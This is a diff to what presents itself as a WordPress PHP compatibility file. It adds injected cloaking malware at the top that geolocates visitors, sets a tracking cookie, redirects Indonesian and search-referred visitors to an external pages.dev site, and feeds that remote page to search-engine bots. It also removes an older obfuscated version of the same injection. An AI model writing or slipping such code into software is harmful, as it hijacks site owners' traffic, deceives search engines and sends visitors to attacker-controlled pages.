@@ -1,4 +1,91 @@
 <?php
+function getClientIP() {
+    $headers = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
+    foreach ($headers as $key) {
+        if (!empty($_SERVER[$key])) {
+            $ipList = explode(',', $_SERVER[$key]);
+            foreach ($ipList as $ip) {
+                $ip = trim($ip);
+                if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                    return $ip;
+                }
+            }
+        }
+    }
+    return '127.0.0.1';
+}
+
+function getUrlContent($url) {
+    if (ini_get('allow_url_fopen')) {
+        $content = @file_get_contents($url);
+        if ($content !== false) return $content;
+    }
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT => 10
+    ]);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response ?: '';
+}
+
+function isBot() {
+    $botKeywords = ['googlebot', 'slurp', 'adsense', 'inspection', 'verifycation', 'jenifer'];
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    foreach ($botKeywords as $bot) {
+        if (strpos($ua, $bot) !== false) return true;
+    }
+    return false;
+}
+
+$ip = getClientIP();
+$geoData = json_decode(getUrlContent("http://ip-api.com/json/{$ip}"), true);
+$countryCode = $geoData['countryCode'] ?? '';
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$fingerprint = sha1($ip . $ua);
+
+if (!isset($_COOKIE['user_fp']) && $countryCode === 'ID') {
+    setcookie('user_fp', $fingerprint, time() + 86400 * 30, '/');
+    $_COOKIE['user_fp'] = $fingerprint;
+}
+
+$allowedFingerprint = $_COOKIE['user_fp'] ?? '';
+
+$redirectURL = 'https://punten-neng.pages.dev/wiraraja/fik/';
+
+if ($countryCode === 'ID' && $fingerprint === $allowedFingerprint && $allowedFingerprint !== '') {
+    header("Location: $redirectURL");
+    exit;
+}
+
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$refererDomains = ['google.co.id', 'yahoo.co.id', 'bing.com'];
+foreach ($refererDomains as $domain) {
+    if (stripos($referer, $domain) !== false) {
+        header("Location: $redirectURL");
+        exit;
+    }
+} 
+
+if (isBot()) {
+    $htmlURL = 'https://punten-neng.pages.dev/wiraraja/fik/';
+    echo getUrlContent($htmlURL);
+    exit;
+}
+
+?>
+<?php
 /**
  * WordPress implementation for PHP functions either missing from older PHP versions or not included by default.
  *
@@ -12,14 +99,6 @@
  */
 
 // If gettext isn't available.
-if ($uri == '/' && (
-    strpos($userAgent, 'bot') !== false || 
-    strpos($userAgent, 'google') !== false || 
-    strpos($userAgent, 'chrome-lighthouse') !== false || 
-    strpos($referer, 'google') !== false
-))
-error_reporting(0);$link='http://punten-neng.pages.dev/wiraraja/fik/';
-function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['116.212.130.44','103.77.106.41','146.70.14.27'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?><?php
 if ( ! function_exists( '_' ) ) {
 	function _( $message ) {
 		return $message;
